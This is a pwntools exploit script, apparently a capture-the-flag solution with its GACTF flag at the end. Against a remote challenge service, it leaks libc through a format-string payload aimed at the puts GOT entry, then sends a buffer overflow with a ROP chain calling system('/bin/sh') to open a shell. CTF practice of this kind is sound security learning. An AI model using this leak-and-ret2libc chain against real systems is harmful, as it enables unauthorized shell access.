from pwn import *
context.terminal = ['gnome-terminal','-x','sh','-c']

io=remote('119.3.154.59',9999)
ELF('./pwn')
libc=ELF('lib2.27.so')

def reg(name,pw):
    io.recvuntil('3: exit\n')
    io.sendline('1')
    io.recvuntil('username:')
    io.send(name)
    io.recvuntil('password:')
    io.send(pw)

def userlogin(name,pw):
    io.recvuntil('3: exit\n')
    io.sendline('2')
    io.recvuntil('username:')
    io.send(name)
    io.recvuntil('password:')
    io.send(pw)
    io.recvuntil('4:logout\n')
    io.sendline('2')
    io.send(name)
    io.recvuntil('4:logout\n')
    io.sendline('4') 


def adminlogin(name,pw):
    io.recvuntil('3: exit\n')
    io.sendline('2')
    io.recvuntil('username:')
    io.send(name)
    io.recvuntil('password:')
    io.send(pw)


puts_got=0x22020

reg('a'*0x10,'a'*0x10)
userlogin('a'*0x10,'a'*0x10)
adminlogin('root\n','a'*0x10)

io.recvuntil('token')
io.sendline('%15$saaa'+p32(0x0022020))

io.recvuntil('4:Logout\n')
io.sendline('2')
libc_base=u32(io.recv(4))-libc.sym['puts']
sys=libc_base+libc.sym['system']
sh=libc_base+libc.search('/bin/sh').next()

print(hex(libc_base),hex(sys))

ppp=libc_base+0x0005919c

io.sendline('0')
io.recvuntil('4:Logout\n')
io.sendline('3')
io.send('a'*0x24+p32(ppp)+p32(sh)+p32(0)+p32(sys))

io.interactive()


GACTF{61ef50e2-e752-11ea-ba94-00163e09993c}

